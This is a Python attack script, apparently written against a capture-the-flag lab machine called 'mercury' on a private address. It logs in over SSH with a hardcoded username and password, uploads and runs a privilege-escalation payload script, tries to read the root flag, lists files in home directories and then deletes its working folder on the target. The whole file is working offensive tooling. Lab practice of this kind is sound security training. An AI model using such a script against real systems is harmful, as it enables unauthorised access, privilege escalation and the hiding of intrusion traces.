#!/usr/bin/env python3
"""Execute mercury escalation payload on linuxmaster@192.168.56.113"""
import sys
sys.path.insert(0, '/home/surzal/git/Documents/SurzsEnviro')

from SurzsEnviro.muesem.netrunning import NetRunning
import os

TARGET = "192.168.56.113"
USERNAME = "linuxmaster"
PASSWORD = "mercurymeandiameteris4880km"

# Read the escalation payload
payload_path = "/home/surzal/git/payloads/mercury-escalation.sh"
with open(payload_path, "r") as f:
    payload_script = f.read()

print(f"[*] Connecting to {TARGET} as {USERNAME}...")
client = NetRunning.ssh_payload(TARGET, USERNAME, PASSWORD)

# The ssh_payload already executed a generic flow. Let's run our custom enumeration directly.
import paramiko
client2 = paramiko.SSHClient()
client2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client2.connect(TARGET, username=USERNAME, password=PASSWORD, timeout=10)

def run(cmd):
    stdin, stdout, stderr = client2.exec_command(cmd)
    out = stdout.read().decode().strip()
    err = stderr.read().decode().strip()
    return out, err

print("\n" + "=" * 60)
print("MERCURY ESCALATION - EXECUTING ENUMERATION")
print("=" * 60 + "\n")

# Write and execute the payload script
client2.exec_command("mkdir -p /tmp/lab && cp /dev/stdin /tmp/lab/mercury-escalation.sh")
stdin, _, _ = client2.exec_command(f"echo '{payload_script}' | tee /tmp/lab/mercury-escalation.sh")

# Execute the enumeration
print("[*] Running enumeration on target...")
stdout, stderr = run("bash /tmp/lab/mercury-escalation.sh 2>&1")
print(stdout)
if stderr:
    print(f"\n[STDERR]: {stderr}")

print("\n" + "=" * 60)
print("ENUMERATION COMPLETE - ANALYZING RESULTS")
print("=" * 60)

# Check for interesting findings
stdout2, _ = run("cat /root/root.txt 2>/dev/null || echo 'NO ROOT FLAG YET'")
if "NO ROOT FLAG" not in stdout2:
    print(f"\n[+] ROOT FLAG FOUND: {stdout2}")

stdout3, _ = run("ls -la /home/linuxmaster/ 2>/dev/null")
print(f"\n[*] linuxmaster home contents:\n{stdout3}")

stdout4, _ = run("find /home -name '*.txt' -o -name '*.md' 2>/dev/null")
print(f"\n[*] Text files in /home:\n{stdout4}")

# Cleanup on target
client2.exec_command("rm -rf /tmp/lab")
client2.close()

print("\n[+] SSH session closed. Review output above for escalation paths.")
